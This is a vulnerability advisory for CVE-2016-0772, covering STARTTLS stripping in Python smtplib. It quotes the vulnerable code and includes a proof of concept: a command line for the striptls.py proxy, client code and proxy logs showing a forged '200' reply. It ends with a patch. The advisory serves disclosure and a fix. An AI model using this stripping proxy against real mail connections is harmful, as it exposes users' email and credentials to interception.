{
    "text": "vul_name : Python smtplib 2.7.11 / 3.4.4 / 3.5.1 Man In The Middle StartTLS Stripping ， vul_cve : CVE-2016-0772 ， vul_poc : VuNote ， Author : <github.com/tintinweb> ， Version : 0.2 ， Date : Nov 25th , 2015 ， Tag : python smtplib starttls stripping ( mitm )  ， Overview ， Name : python ， Vendor : python software foundation ， Version : 2.7.11 , 3.4.4 , 3.5.1 ， Latest Version : 2.7.11 , 3.4.4 , 3.5.1 [ 2 ]  ， Other Versions : 2.2 [ 3 ]  (  ~ 14 years ago ) <= affected <= 2.7.11 ， 3.0 [ 3 ]  (  ~ 7 years ago ) <= affected <= 3.4.4 ， 3.5.1 ， Platform ( s )  : cross ， Technology : c/python ， Vuln Classes : Selection of Less-Secure Algorithm During Negotiation ( CWE-757 )  ， Origin : remote/mitm ， Min. Privs. : - ， CVE : CVE-2016-0772 ， Description ， quote wikipedia [ 4 ]  ， >Python is a widely used high-level , general-purpose , interpreted , dynamic programming language. Its design philosophy emphasizes code readability , and its syntax allows programmers to express concepts in fewer lines of code than would be possible in languages such as C+ or Java. [ 24 ]  [ 25 ] The language provides constructs intended to enable clear programs on both a small and large scale. ， Summary ， python smtplib does not seem to raise an exception when the remote ， end ( smtp server ) is capable of negotiating starttls ( as seen in the ， response to ehlo ) but fails to respond with 220 ( ok ) to an explicit ， call of `SMTP.starttls (  ) `. This may allow a malicious mitm to perform a ， starttls stripping attack if the client code does not explicitly check ， the response code for starttls , which is rarely done as one might ， expect that it raises an exception when starttls negotiation fails ，  ( like when calling starttls on a server that does not support it or ， when it fails to negotiate tls due to an ssl exception/cipher ， mismatch/auth fail ) . ， Quoting the PSRT with an extended analysis ， > It is a surprising and potential dangerous behavior. It also violates Python's documentation. states that all SMTP commands after starttls (  ) are encrypted. That's clearly not true in case of response ! = 200. I also had a look how the other stdlib libraries handle starttls problems. nntplib's and imaplib's starttls (  ) method raise an error when the starttls handshake fails. ， Checking on how `smtplib.starttls (  ) ` is actually being used by open-source projects underlines that `smtplib.starttls (  ) ` is generally expected to throw an exception if the starttls protocol was not executed correctly. Therefore this issue may have an impact on some major projects like Django , web2py. Apart from that the current `smtplib.starttls (  ) ` behavior is different to `nntplib.starttls (  ) ` , `imaplib.starttls (  ) ` ， PoC see [ 6 ]  ， patch attached. ， Details ， The vulnerable code is located in `lib/smtplib.py` [ 3 ] line 646 ( 2.7 branch ) and ， fails to raise an exception if `resp ! =220`. ， The documentation [ 7 ] suggests that `starttls (  ) ` either encrypts all communication ， or throws an exception if it was not able to negotiate tls. ， SMTP.starttls (  [ keyfile [  , certfile ]  )  ， Put the SMTP connection in TLS ( Transport Layer Security ) mode. All SMTP commands that follow will be encrypted. You should then call ehlo (  ) again. ， If keyfile and certfile are provided , these are passed to the socket modules ssl (  ) function. ， If there has been no previous EHLO or HELO command this session , this method tries ESMTP EHLO first. ， Changed in version 2.6. ， SMTPHeloError ， The server didnt reply properly to the HELO greeting. ， SMTPException ， The server does not support the STARTTLS extension. ， Changed in version 2.6. ， RuntimeError ， SSL/TLS support is not available to your Python interpreter. ， Code `lib/smtplib.py` :  ， Inline annotations are prefixed with `/ #  ! ` ， \"Puts the connection to the SMTP server into TLS mode. ， If there has been no previous EHLO or HELO command this session , this ， method tries ESMTP EHLO first. ， If the server supports TLS , this will encrypt the rest of the SMTP ， session. If you provide the keyfile and certfile parameters ,  ， the identity of the SMTP server and client can be checked. This ,  ， however , depends on whether the socket module really checks the ， certificates. ， This method may raise the following exceptions :  ， SMTPHeloError The server didn't reply properly to ， the helo greeting. ， \" ， self.ehlo_or_helo_if_needed (  )  ， raise SMTPException ( \"STARTTLS extension not supported by server.\" )  ，  ( resp , reply ) = self.docmd ( \"STARTTLS\" )  ， raise RuntimeError ( \"No SSL support included in this Python\" )  ， self.sock = ssl.wrap_socket ( self.sock , keyfile , certfile )  ， self.file = SSLFakeFile ( self.sock )  ，  # RFC 3207 :  ，  # The client MUST discard any knowledge obtained from ，  # the server , such as the list of SMTP service extensions ,  ，  # which was not obtained from the TLS negotiation itself. ， self.helo_resp = None ， self.ehlo_resp = None ， self.esmtp_features = {} ， self.does_esmtp = 0 ， / #  ! or that the socket was turned into an SSLSock object ， Proof of Concept ， 1. start `striptls.py` proxy ，  # > python striptls/striptls.py -l 0.0.0.0 : 9999 -r remote.mailserver.tld : 25 -x SMTP.StripWithInvalidResponseCode ， - INFO - <Proxy 0x1f04910 listen= ( '0.0.0.0' , 9999 ) target= ( 'remote.mailserver.tld' , 25 ) > ready. ， - DEBUG - * added test ( port : 25 , proto : SMTP )  : <class _main_.StripWithInvalidResponseCode at 0x020F85E0> ， - INFO - <RewriteDispatcher vectors={25 : set (  [ <class _main_.StripWithInvalidResponseCode at 0x020F85E0> ]  ) }> ， 2. send mail using `smtplib` ( starttls )  ， server = smtplib.SMTP ( 'localhost' , port=9999 )  ， server.set_debuglevel ( 1 )  ， server.ehlo (  )  ， print server.esmtp_features ， server.starttls (  )  ， server.sendmail ( \"a @ b.com\" , \"b @ a.com\" , \"From : a @ b.com\\r\\nTo : b @ a.com\\r\\n\\r\\n\" )  ， server.quit (  )  ， 3. watch `striptls.py` fake the server response with `resp=200` instead of `resp=220` , not forwarding the message to the server. This effectively strips starttls. `smtplib` keeps sending in plaintext with no indication to the client code that starttls negotiation actually failed. ， - DEBUG - <ProtocolDetect 0x1f25530 protocol_id=PROTO_SMTP len_history=0> - protocol detected ( target port )  ， - INFO - <Session 0x1f0ea50> client ( '127.0.0.1' , 59687 ) has connected ， - INFO - <Session 0x1f0ea50> connecting to target ( 'remote.mailserver.tld' , 25 )  ， - DEBUG - <Session 0x1f0ea50> [ client ] <= [ server ] '220 mailserver.tld ( msrv002 ) Nemesis ESMTP Service ready\\r\\n' ， - DEBUG - <RewriteDispatcher - changed mangle : _main_.StripWithInvalidResponseCode new : True> ， - DEBUG - <Session 0x1f0ea50> [ client ] => [ server ] 'ehlo [ 192.168.139.1 ] \\r\\n' ， - DEBUG - <Session 0x1f0ea50> [ client ] <= [ server ] '250-gmx.com Hello [ 192.168.139.1 ]  [ x.x.x.x ] \\r\\n250-SIZE 3 1457280\\r\\n250-AUTH LOGIN PLAIN\\r\\n250 STARTTLS\\r\\n' ， - DEBUG - <Session 0x1f0ea50> [ client ] => [ server ] 'STARTTLS\\r\\n' ， - DEBUG - <Session 0x1f0ea50> [ client ] <= [ server ]  [ mangled ] '200 STRIPTLS\\r\\n' ， - DEBUG - <Session 0x1f0ea50> [ client ] => [ server ]  [ mangled ] None ， - DEBUG - <Session 0x1f0ea50> [ client ] => [ server ] 'mail FROM : <a @ b.com> size=10\\r\\n' ， - DEBUG - <Session 0x1f0ea50> [ client ] <= [ server ] '530 Authentication required\\r\\n' ， - DEBUG - <Session 0x1f0ea50> [ client ] => [ server ] 'rset\\r\\n' ， - DEBUG - <Session 0x1f0ea50> [ client ] <= [ server ] '250 OK\\r\\n' ， - WARNING - <Session 0x1f0ea50> terminated. ， Patch ，  * raise an exception if the server replies with an unexpected return-code to an explicit call for `smtplib.starttls (  ) `. ，  # <master> diff -git a/Lib/smtplib.py b/Lib/smtplib.py index 4756973.dfbf5f9 100755 ， - a/Lib/smtplib.py ， + b/Lib/smtplib.py ， -773 , 6 +773 , 11 class SMTP :  ， self.ehlo_resp = None ， self.esmtp_features = {} ， self.does_esmtp = 0 ， + else :  ， + # RFC 3207 :  ， + # 501 Syntax error ( no parameters allowed )  ， + # 454 TLS not available due to temporary reason ， + raise SMTPResponseException ( resp , reply )  ， Notes ， Vendor response : see [ 8 , 9 , 10 ] ",
    "time": "2018.01.12"
}